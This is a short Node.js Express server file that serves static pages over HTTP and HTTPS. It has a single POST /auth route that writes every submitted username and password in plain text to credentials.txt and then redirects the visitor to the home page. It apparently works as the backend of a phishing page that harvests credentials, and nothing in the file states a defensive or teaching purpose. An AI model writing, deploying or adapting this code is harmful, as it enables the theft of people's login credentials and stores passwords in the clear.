var fs = require('fs');
var http = require('http');
var https = require('https');
var bodyParser = require('body-parser')
var privateKey = fs.readFileSync('server_key.pem', 'utf8');
var certificate = fs.readFileSync('server_crt.pem', 'utf8');

var writeStream = fs.createWriteStream("credentials.txt", { encoding: 'utf8' });
var credentials = { key: privateKey, cert: certificate };
var express = require('express');
var app = express();
app.use(bodyParser.json());       // to support JSON-encoded bodies
app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
    extended: true
}));
app.use(express.json());       // to support JSON-encoded bodies
app.use(express.urlencoded()); // to support URL-encoded bodies

// your express configuration here
var httpServer = http.createServer(app);
var httpsServer = https.createServer(credentials, app);

httpServer.listen(8080);
console.log("HTTP is running")
httpsServer.listen(8000);
console.log("HTTPS is running")


app.use(express.static(__dirname + "/static/"))

app.post('/auth', (req, res, next) => {
    writeStream.write(`
        ${req.body.username}\t
        ${req.body.password}
    `)
    res.redirect('/')
})